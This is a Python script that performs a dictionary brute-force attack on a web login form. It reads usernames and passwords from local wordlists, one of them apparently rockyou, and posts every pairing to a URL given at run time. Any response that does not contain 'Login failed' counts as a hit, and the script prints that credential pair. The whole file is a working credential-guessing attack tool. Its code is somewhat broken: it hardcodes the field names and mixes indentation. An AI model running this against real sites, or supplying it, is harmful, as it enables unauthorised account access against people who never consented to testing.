import requests
from bs4 import BeautifulSoup
from lxml import html
import time

def scan():
	print("Please Examine the form carefully and enter the details..")
	url=input("URL=")
	uf=input("name of user field in <form> =")
	pf=input("name of the password field in <form> =")
	bt=input("name of the button field in <form> =")
	ut=input("name of the hidden field in <form>(Leave empty if not) =")

	print("Connecting.......................................................")
	with open("/root/Downloads/pas.txt", "r") as fd:
		lines = fd.read().splitlines()
		for user in lines:
	 		with open("/root/Downloads/rock.txt") as fe:
			        liness=fe.read().splitlines()
			        for password in  liness:
				        dados = {uf:"",pf:"",bt:"submit",ut:""}
				        dados["password"]=password
				        dados["username"]=user
				        request = requests.post(url, data=dados)
				        if "404" in request.text or "404 not found" in request.text or request.status_code==400:
					        print("Error")
					        break
				        else:
					        if "Login failed" in request.text:
						        print ("Trying : user: "+user+" and password: "+password)
					        else:
						        print(user,password)
						        exit()

def main():
    	scan()

if __name__=='__main__':
	main()
